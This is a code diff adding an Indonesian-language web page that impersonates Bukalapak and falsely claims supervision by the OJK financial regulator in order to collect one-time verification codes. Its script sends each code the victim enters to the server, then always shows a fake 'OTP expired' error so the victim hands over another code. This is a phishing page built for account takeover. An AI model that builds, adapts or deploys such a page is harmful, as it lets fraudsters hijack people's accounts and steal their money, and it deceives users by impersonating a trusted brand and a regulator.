@@ -1,0 +1,195 @@
+<!DOCTYPE html>  
+<html lang="id">  
+<head>  
+  <meta charset="UTF-8">  
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">  
+  <title>Verifikasi Kode Pengajuan</title>  
+  <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>  
+  <style>  
+    * {  
+      box-sizing: border-box;  
+    }  
+  
+    body {  
+      font-family: Arial, sans-serif;  
+      margin: 0;  
+      padding: 20px;  
+      background-color: #f9f9f9;  
+      display: flex;  
+      justify-content: center;  
+      align-items: center;  
+      min-height: 100vh;  
+    }  
+  
+    .container {  
+      background: #fff;  
+      border-radius: 10px;  
+      padding: 25px 20px;  
+      width: 100%;  
+      max-width: 400px;  
+      box-shadow: 0 4px 12px rgba(0,0,0,0.05);  
+    }  
+  
+    .judul-wrapper {  
+      margin-bottom: 20px;  
+      text-align: center;  
+    }  
+  
+    .judul-wrapper .garis-atas,  
+    .judul-wrapper .garis-bawah {  
+      height: 1px;  
+      background-color: #ddd;  
+    }  
+  
+    .judul-wrapper h2 {  
+      font-size: 18px;  
+      font-weight: bold;  
+      margin: 10px 0;  
+    }  
+  
+    p {  
+      font-size: 14px;  
+      margin: 5px 0;  
+      text-align: center;  
+    }  
+  
+    .resend {  
+      color: #d5004c;  
+      text-decoration: none;  
+      font-weight: bold;  
+    }  
+  
+    .container img {  
+      width: 100%;  
+      max-width: 350px;  
+      display: block;  
+      margin: 20px auto;  
+    }  
+  
+    input[type="tel"] {  
+      width: 100%;  
+      padding: 12px;  
+      border-radius: 6px;  
+      border: 1px solid #ccc;  
+      margin: 20px 0;  
+      font-size: 14px;  
+    }  
+  
+    button {  
+      background-color: #d5004c;  
+      color: white;  
+      border: none;  
+      padding: 12px;  
+      font-size: 15px;  
+      width: 100%;  
+      border-radius: 6px;  
+      cursor: pointer;  
+      font-weight: bold;  
+    }  
+  
+    button:hover {  
+      background-color: #b8003f;  
+    }  
+  
+    .timer {  
+      margin-top: 15px;  
+      font-size: 13px;  
+      text-align: center;  
+    }  
+  
+    #responseMessage {  
+      margin-top: 10px;  
+      font-size: 13px;  
+      color: red;  
+      text-align: center;  
+    }  
+  
+    @media (max-width: 360px) {  
+      .container {  
+        padding: 20px 15px;  
+      }  
+  
+      button {  
+        font-size: 14px;  
+        padding: 10px;  
+      }  
+  
+      input[type="tel"] {  
+        font-size: 13px;  
+        padding: 10px;  
+      }  
+    }  
+  </style>  
+</head>  
+<body>  
+  
+<div class="container">  
+  <div class="judul-wrapper">  
+    <div class="garis-atas"></div>  
+    <h2>Verifikasi Pengajuan</h2>  
+    <div class="garis-bawah"></div>  
+  </div>  
+  
+  <p>Kode verifikasi Pengajuan telah dikirim ke <b id="tujuanOtp">[memuat...]</b></p>  
+  <p> <a href="#" class="resend"></a></p>  
+  
+  <img src="assets/konfirmasi.jpg" alt="Bukalapak">  
+  
+  <p>Masukkan kode Pengajuan yg sudah dikirimkan dikotak isian di bawah ini</p>  
+  
+  <form id="otpForm">  
+    <input type="tel" name="otp" placeholder="Masukan kode " maxlength="5">  
+    <button type="submit">Konfirmasi</button>  
+  </form>  
+  
+  <div id="responseMessage"></div>  
+  
+  <div class="timer">  
+    Mitra Bukalapak  Terdaftar dan Diawasi oleh <a href="#" class="resend">OTORITAS JASA KEUANGAN</a> (OJK) </b>  
+  </div>  
+</div>  
+  
+<script>  
+  const tujuan = sessionStorage.getItem('otp_tujuan');  
+  document.getElementById('tujuanOtp').innerText = tujuan ?? "[tidak tersedia]";  
+  
+  let time = 100;  
+  const countdownEl = document.getElementById('countdown');  
+  const timer = setInterval(() => {  
+    let minutes = Math.floor(time / 60);  
+    let seconds = time % 60;  
+    if (seconds < 10) seconds = '0' + seconds;  
+    countdownEl.innerText = `${minutes}:${seconds}`;  
+    time--;  
+    if (time < 0) clearInterval(timer);  
+  }, 1000);  
+  
+  document.getElementById('otpForm').addEventListener('submit', function(e) {  
+    e.preventDefault();  
+  
+    const formData = new FormData(this);  
+    fetch('otp.html', {  
+      method: 'POST',  
+      body: formData  
+    })  
+    .then(() => {  
+      Swal.fire({  
+        title: 'Gagal!',  
+        text: 'Kode OTP kadaluarsa,masukan kode baru .',  
+        icon: 'error',  
+        confirmButtonText: 'Coba Lagi'  
+      });  
+    })  
+    .catch(() => {  
+      Swal.fire({  
+        title: 'Error!',  
+        text: 'Tidak dapat terhubung ke server.',  
+        icon: 'error',  
+        confirmButtonText: 'OK'  
+      });  
+    });  
+  });  
+</script>  
+  
+</body>  
+</html>
